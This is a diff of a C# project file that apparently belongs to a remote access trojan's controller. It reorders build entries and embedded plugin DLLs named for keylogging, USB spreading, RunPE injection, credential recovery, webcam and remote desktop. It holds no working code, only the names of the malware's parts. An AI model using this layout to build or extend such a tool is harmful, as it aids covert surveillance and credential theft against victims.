@@ -180,11 +180,12 @@
       <DependentUpon>FormWebcam.cs</DependentUpon>
     </Compile>
     <Compile Include="Handle Packet\HandleChat.cs" />
-    <Compile Include="Handle Packet\HandleKeylogger.cs" />
     <Compile Include="Handle Packet\HandleFileManager.cs" />
+    <Compile Include="Handle Packet\HandleKeylogger.cs" />
     <Compile Include="Handle Packet\HandleListView.cs" />
     <Compile Include="Handle Packet\HandleLogs.cs" />
     <Compile Include="Handle Packet\HandlePing.cs" />
+    <Compile Include="Handle Packet\HandlePlugin.cs" />
     <Compile Include="Handle Packet\HandleRecovery.cs" />
     <Compile Include="Handle Packet\HandleRemoteDesktop.cs" />
     <Compile Include="Handle Packet\HandleReportWindow.cs" />
@@ -317,12 +318,15 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="async_icon.ico" />
-    <None Include="Resources\PluginUsbSpread.dll" />
-    <None Include="Resources\PluginRecovery.dll" />
-    <None Include="Resources\PluginRunPE.dll" />
+    <None Include="Resources\PluginFileManager.dll" />
     <None Include="Resources\PluginDesktop.dll" />
-    <None Include="Resources\webcam.png" />
+    <None Include="Resources\PluginChat.dll" />
     <None Include="Resources\PluginCam.dll" />
+    <None Include="Resources\LimeLogger.dll" />
+    <None Include="Resources\PluginUsbSpread.dll" />
+    <None Include="Resources\PluginRunPE.dll" />
+    <None Include="Resources\PluginRecovery.dll" />
+    <None Include="Resources\webcam.png" />
     <None Include="Resources\netstat.png" />
     <None Include="Resources\blank-screen.png" />
     <None Include="Resources\save-image2.png" />
